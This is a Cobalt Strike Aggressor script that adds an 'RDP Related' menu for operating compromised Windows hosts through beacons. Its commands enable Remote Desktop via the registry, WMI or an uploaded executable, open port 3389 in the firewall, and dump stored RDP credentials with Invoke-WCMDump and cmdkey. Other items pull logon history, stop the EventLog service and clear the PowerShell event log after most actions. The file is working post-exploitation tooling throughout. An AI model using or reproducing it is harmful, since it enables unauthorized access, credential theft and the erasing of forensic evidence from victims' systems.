menu "RDP Related" {
    item "Querying RDP Status" {
		blog($1, "\c9=========== Querying RDP Status ==========");        
        bpowershell_import($1, script_resource("scripts/RemoteLogin/CheckRdpStatus.ps1"));
        bpowerpick($1,"CheckRdpStatus");
        bshell($1,"wevtutil cl \"Windows PowerShell\"");
    }        
    item "Get RDP port" {
		blog($1, "\c9=========== Get RDP port ==========");
        blog($1, "Manual confirmation: shell netstat -ano | findstr \$RDP port")                 
        local('$bid');
        foreach $bid ($1){
        blog($1, "Check Rdp Open Port");
        bpowershell_import($bid, script_resource("scripts/RemoteLogin/RegRdpPort.ps1"));
        bpowerpick($bid,"RegRdpPort");
        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
        }
    }
    separator();
    menu "Turn on RDP service" {
        item "Powershell" {
            blog($1, "\c9=========== Turn on RDP service (Powershell) ==========");
            bpowershell_import($1, script_resource("scripts/RemoteLogin/RegfDenyTSConnections.ps1"));
            bpowerpick($1,"RegfDenyTSConnections 0");
            bshell($1,"wevtutil cl \"Windows PowerShell\"");
        }
        item "Registration Form" {
            blog($1, "\c9=========== Turn on RDP service (registry) ==========");
            $bid = $1['@'];
            bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f");
            bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1");
        }

        menu "WinAPI" {
            item "UploadStartRdp" {
            blog($1, "\c9=========== UploadStartRdp ==========");
                $bid = $1;
                $dialog = dialog("Upload StartRdp.exe", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &open-3389);
                dialog_description($dialog, "Use WindowsAPI Open RDP");
                drow_text($dialog, "UploadPath",  "Upload path: ");
                dbutton_action($dialog, "Upload");
                dialog_show($dialog);
                }
                sub open-3389{
                bcd($bid, $3['UploadPath']);
                bupload($bid, script_resource("scripts/RemoteLogin/StartRdp.exe"));
            }
            item "Run StartRdp" {
            blog($1, "\c9=========== Run StartRdp ==========");
                bshell($bid, "StartRdp.exe");
            }
            item "Delete StartRdp" {
            blog($1, "\c9=========== Delete StartRdp ==========");
                local('$bid');
                foreach $bid ($1){
                    bshell($1, "taskkill -f /im StartRdp.exe & del /f /s /q StartRdp.exe");
                    bshell($bid, "del C:\\Windows\\Temp\\StartRdp.exe");
                }
            }
        }
    }    
    menu "Shutting down the RDP service" {
        item "Powershell" {
            blog($1, "\c9=========== Shutting down the RDP service (Powershell) ==========");
            bpowershell_import($1, script_resource("scripts/RemoteLogin/RegfDenyTSConnections.ps1"));
            bpowerpick($1,"RegfDenyTSConnections 1");
            bshell($1,"wevtutil cl \"Windows PowerShell\"");
        }
        item "Registration Form" {
            blog($1, "\c9=========== Shutting down the RDP service (registry) ==========");
            $bid = $1['@'];
            bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 1 /f");
            bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
        }
    }
    separator();
    item "Firewall Release RDP Rules" {
        blog($1, "\c9=========== Firewall Release RDP Rules ==========");
        $bid = $1['@'];
        blog($bid,"If the system has not been configured for remote desktop service, you also need to add a firewall rule to allow port 3389 when you open it for the first time");
        bshell($bid, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
    }
    menu "Other RDP related information" {
        item "Query RDP historical login credentials" {
            blog($1, "\c9=========== Query RDP historical login credentials =========");
            bshell($bid,"cmdkey /list");
        }
        item "Get RDP historical login credentials" {
            blog($1, "\c9=========== Get RDP historical login credentials ==========");
            bpowershell_import($1, script_resource("scripts/RemoteLogin/Invoke-WCMDump.ps1"));
            bpowerpick($1, "Invoke-WCMDump");
            bshell($1,"wevtutil cl \"Windows PowerShell\"");
        }
        item "Get RDP Login Success History Log" {
            blog($1, "\c9=========== Get RDP Login Success History Log ==========");
            bpowershell_import($1, script_resource("scripts/RemoteLogin/EventLogSuccess.ps1"));
            bpowerpick($1, "EventLogSuccess");
            bshell($1,"wevtutil cl \"Windows PowerShell\"");
        }
        item "Get RDP login failure history log" {
            blog($1, "\c9=========== Get RDP login failure history log ==========");
            bpowershell_import($1, script_resource("scripts/RemoteLogin/EventLogFailed.ps1"));
            bpowerpick($1, "EventLogFailed");
            bshell($1,"wevtutil cl \"Windows PowerShell\"");
        }
        item "Query RDP Log Path" {
            blog($1, "\c9=========== Query RDP log path ==========");
            bshell($1,"wmic nteventlog get path\,filename\,writeable");
        }
    }    
    separator();
    item "Shutting down the EventlogService service" {
		blog($1, "\c9=========== Shutting down the EventlogService service ==========");
        bpowershell_import($1, script_resource("scripts/RemoteLogin/KillEvenlogService.ps1"));
        bpowerpick($1,"KillEvenlogService");
    }
    item "Turn on the EventlogService service" {
		blog($1, "\c9=========== Turn on the EventlogService service ==========");
        bshell($bid,"net start eventlog");              
    } 
}
